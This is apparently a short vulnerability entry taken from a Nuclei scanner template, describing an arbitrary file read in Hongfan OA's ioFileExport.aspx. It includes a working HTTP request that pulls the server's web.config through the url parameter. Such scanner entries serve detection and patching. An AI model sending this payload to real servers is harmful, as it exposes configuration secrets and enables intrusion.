# Vulnerability: Hongfan OA ioFileExport.aspx - Arbitrary File Read
**Classification:** HONGFAN
**Source:** Nuclei Template (`hongfan-ioffice-lfi.yaml`)

## Description
Arbitrary File Read vulnerability in the Hongfan OA ioFileExport.aspx file, through which an attacker can obtain sensitive server information

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename={{filename}}.txt&ContentType=application/octet-stream
```

